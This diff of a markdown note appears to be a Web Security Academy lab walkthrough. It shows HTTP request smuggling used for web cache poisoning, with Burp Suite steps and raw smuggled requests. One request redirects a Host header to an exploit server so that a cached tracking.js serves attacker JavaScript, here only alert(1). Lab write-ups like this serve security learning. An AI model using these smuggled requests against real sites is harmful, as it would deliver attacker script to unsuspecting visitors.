@@ -28,45 +28,133 @@ An attacker can exploit the request smuggling vulnerability to perform web cache
 
 An attacker can exploit the request smuggling vulnerability to perform web cache poisoning attack. This will the attack more persisten, whoever visits the application's page after the cache is poisoned will access the manipulated url.
 
+
+
 # Instructions
+
+
+
+
 
 1. Navigate to blog post and click on next post and intercept the subsequent request using burp suite.
 
+
+
+
+
+![fc303f47-7e3d-430e-ae47-766ca45eadd1.png]()
+
+
+
 2.Send the request to the repeater tab.
+
+
+
+
+
+![dca30b31-06b7-427f-bd3d-62ae54b8b466.png]()
+
+
+
+
+
+
 
 3. Smuggle the request by adding the following lines at the bottom of the above request with a different host header.
 
-`0`
 
+
+`0`
+ 
  `GET /post/next?postId=3 HTTP/1.1`
  `Host: 127.0.0.1`
  `Content-Type: application/x-www-form-urlencoded`
  `Content-Length: 10`
-
+ 
  `x=1`
 
+
+
+
+
+![aa0728fc-0301-4965-b9cd-a2486801efba.png]()
+
+
+
+
+
 4.Above request can be used to make the next request to get the redirection on a host header with malicious domain.
+
+
+
+
+
+
+
+![db5eca7d-82cc-44ca-8056-b45361623afa.png]()
+
+
+
+
 
 5.Craft a JS code to trigger a alert and host it on the server .
 
 alert(1)
 
+
+
 6.Poison the server by repeatedly sending the request to the server then fetch the resources/js/tracking.js 
 
-`0`
 
+
+`0`
+ 
  `GET /post/next?postId=3 HTTP/1.1`
  `Host: your-exploit-server-hostname.web-security-academy.net`
  `Content-Type: application/x-www-form-urlencoded`
  `Content-Length: 10`
-
+ 
  `x=1`
+
+
 
 `GET /resources/js/tracking.js HTTP/1.1`
  `Host: your-lab-id.web-security-academy.net`
  `Connection: close`
 
+
+
+
+
+
+
+![479b590d-53a5-41f0-b876-1f266c2adf70.png]()
+
+
+
+
+
+
+
+![95d4393c-cbd6-4f98-b0b3-1f7259143d40.png]()
+
+
+
+
+
 7.After sending the request multiple times ,observe that the cache is poisned with the crafted exploit from step 5 . Any subsequent visits by the user will trigger the exploit.
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -77,3 +165,5 @@ alert(1)
 - [[http request smuggling]]
 - [[Web Applications]]
 - [[web cache posioning]]
+
+
